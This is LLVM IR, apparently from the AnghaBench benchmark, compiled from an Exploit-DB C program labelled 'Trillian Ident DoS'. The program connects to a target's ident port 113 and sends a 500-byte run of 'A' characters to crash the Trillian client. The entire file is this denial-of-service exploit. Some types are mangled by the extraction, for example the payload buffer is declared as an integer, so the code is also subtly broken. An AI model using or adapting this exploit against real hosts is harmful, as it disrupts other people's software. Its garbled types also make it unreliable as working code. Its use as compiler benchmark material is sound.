; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_21804.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_21804.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.hostent = type { i32, i32* }
%struct.TYPE_3__ = type { %struct.TYPE_4__, i32, i32 }
%struct.TYPE_4__ = type { i64 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [21 x i8] c"\0ATrillian Ident DoS\0A\00", align 1
@.str.1 = private unnamed_addr constant [24 x i8] c"----------------------\0A\00", align 1
@.str.2 = private unnamed_addr constant [53 x i8] c"Coded By Lance Fitz-Herbert (Phrizer, DALnet/#KORP)\0A\00", align 1
@.str.3 = private unnamed_addr constant [32 x i8] c"Tested On Version .74 and .73\0A\0A\00", align 1
@.str.4 = private unnamed_addr constant [32 x i8] c"Usage: trillian-ident <address>\00", align 1
@.str.5 = private unnamed_addr constant [22 x i8] c"Making Socket Now...\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@IPPROTO_IP = common dso_local global i32 0, align 4
@SOCKET_ERROR = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [23 x i8] c"Error Creating Socket\0A\00", align 1
@.str.7 = private unnamed_addr constant [16 x i8] c"Socket Created\0A\00", align 1
@INADDR_NONE = common dso_local global i64 0, align 8
@.str.8 = private unnamed_addr constant [24 x i8] c"Trying To Resolve Host\0A\00", align 1
@.str.9 = private unnamed_addr constant [17 x i8] c"Uknown Host: %s\0A\00", align 1
@.str.10 = private unnamed_addr constant [25 x i8] c"Connecting To Server...\0A\00", align 1
@.str.11 = private unnamed_addr constant [17 x i8] c"Couldnt Connect\0A\00", align 1
@.str.12 = private unnamed_addr constant [34 x i8] c"Connected to %s!\0ASending Payload\0A\00", align 1
@payload = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca %struct.hostent*, align 8
  %8 = alloca i32, align 4
  %9 = alloca %struct.TYPE_3__, align 8
  %10 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %11 = load i32, i32* %4, align 4
  %12 = icmp slt i32 %11, 2
  br i1 %12, label %13, label %19

13:                                               ; preds = %2
  %14 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str, i64 0, i64 0))
  %15 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.1, i64 0, i64 0))
  %16 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.2, i64 0, i64 0))
  %17 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.3, i64 0, i64 0))
  %18 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.4, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %100

19:                                               ; preds = %2
  %20 = call i32 @MAKEWORD(i32 1, i32 1)
  %21 = call i32 @WSAStartup(i32 %20, i32* %10)
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.5, i64 0, i64 0))
  %23 = load i32, i32* @AF_INET, align 4
  %24 = load i32, i32* @SOCK_STREAM, align 4
  %25 = load i32, i32* @IPPROTO_IP, align 4
  %26 = call i32 @socket(i32 %23, i32 %24, i32 %25)
  store i32 %26, i32* %8, align 4
  %27 = load i32, i32* %8, align 4
  %28 = load i32, i32* @SOCKET_ERROR, align 4
  %29 = icmp eq i32 %27, %28
  br i1 %29, label %30, label %33

30:                                               ; preds = %19
  %31 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.6, i64 0, i64 0))
  %32 = call i32 (...) @WSACleanup()
  store i32 1, i32* %3, align 4
  br label %100

33:                                               ; preds = %19
  %34 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.7, i64 0, i64 0))
  %35 = load i32, i32* @AF_INET, align 4
  %36 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %9, i32 0, i32 2
  store i32 %35, i32* %36, align 4
  %37 = call i32 @htons(i32 113)
  %38 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %9, i32 0, i32 1
  store i32 %37, i32* %38, align 8
  %39 = load i8**, i8*** %5, align 8
  %40 = getelementptr inbounds i8*, i8** %39, i64 1
  %41 = load i8*, i8** %40, align 8
  %42 = call i64 @inet_addr(i8* %41)
  %43 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %9, i32 0, i32 0
  %44 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %43, i32 0, i32 0
  store i64 %42, i64* %44, align 8
  %45 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %9, i32 0, i32 0
  %46 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %45, i32 0, i32 0
  %47 = load i64, i64* %46, align 8
  %48 = load i64, i64* @INADDR_NONE, align 8
  %49 = icmp eq i64 %47, %48
  br i1 %49, label %50, label %75

50:                                               ; preds = %33
  store %struct.hostent* null, %struct.hostent** %7, align 8
  %51 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i64 0, i64 0))
  %52 = load i8**, i8*** %5, align 8
  %53 = getelementptr inbounds i8*, i8** %52, i64 1
  %54 = load i8*, i8** %53, align 8
  %55 = call %struct.hostent* @gethostbyname(i8* %54)
  store %struct.hostent* %55, %struct.hostent** %7, align 8
  %56 = load %struct.hostent*, %struct.hostent** %7, align 8
  %57 = icmp eq %struct.hostent* %56, null
  br i1 %57, label %58, label %64

58:                                               ; preds = %50
  %59 = load i8**, i8*** %5, align 8
  %60 = getelementptr inbounds i8*, i8** %59, i64 1
  %61 = load i8*, i8** %60, align 8
  %62 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.9, i64 0, i64 0), i8* %61)
  %63 = call i32 (...) @WSACleanup()
  store i32 1, i32* %3, align 4
  br label %100

64:                                               ; preds = %50
  %65 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %9, i32 0, i32 0
  %66 = load %struct.hostent*, %struct.hostent** %7, align 8
  %67 = getelementptr inbounds %struct.hostent, %struct.hostent* %66, i32 0, i32 1
  %68 = load i32*, i32** %67, align 8
  %69 = getelementptr inbounds i32, i32* %68, i64 0
  %70 = load i32, i32* %69, align 4
  %71 = load %struct.hostent*, %struct.hostent** %7, align 8
  %72 = getelementptr inbounds %struct.hostent, %struct.hostent* %71, i32 0, i32 0
  %73 = load i32, i32* %72, align 8
  %74 = call i32 @memcpy(%struct.TYPE_4__* %65, i32 %70, i32 %73)
  br label %75

75:                                               ; preds = %64, %33
  %76 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.10, i64 0, i64 0))
  %77 = load i32, i32* %8, align 4
  %78 = bitcast %struct.TYPE_3__* %9 to %struct.sockaddr*
  %79 = call i32 @connect(i32 %77, %struct.sockaddr* %78, i32 16)
  store i32 %79, i32* %6, align 4
  %80 = load i32, i32* %6, align 4
  %81 = load i32, i32* @SOCKET_ERROR, align 4
  %82 = icmp eq i32 %80, %81
  br i1 %82, label %83, label %86

83:                                               ; preds = %75
  %84 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.11, i64 0, i64 0))
  %85 = call i32 (...) @WSACleanup()
  store i32 1, i32* %3, align 4
  br label %100

86:                                               ; preds = %75
  %87 = load i8**, i8*** %5, align 8
  %88 = getelementptr inbounds i8*, i8** %87, i64 1
  %89 = load i8*, i8** %88, align 8
  %90 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.12, i64 0, i64 0), i8* %89)
  %91 = load i32, i32* @payload, align 4
  %92 = call i32 @memset(i32 %91, i8 signext 65, i32 500)
  %93 = load i32, i32* %8, align 4
  %94 = load i32, i32* @payload, align 4
  %95 = load i32, i32* @payload, align 4
  %96 = call i32 @strlen(i32 %95)
  %97 = call i32 @send(i32 %93, i32 %94, i32 %96, i32 0)
  %98 = call i32 @Sleep(i32 100)
  %99 = call i32 (...) @WSACleanup()
  store i32 0, i32* %3, align 4
  br label %100

100:                                              ; preds = %86, %83, %58, %30, %13
  %101 = load i32, i32* %3, align 4
  ret i32 %101
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @WSAStartup(i32, i32*) #1

declare dso_local i32 @MAKEWORD(i32, i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @WSACleanup(...) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i64 @inet_addr(i8*) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @memcpy(%struct.TYPE_4__*, i32, i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @memset(i32, i8 signext, i32) #1

declare dso_local i32 @send(i32, i32, i32, i32) #1

declare dso_local i32 @strlen(i32) #1

declare dso_local i32 @Sleep(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
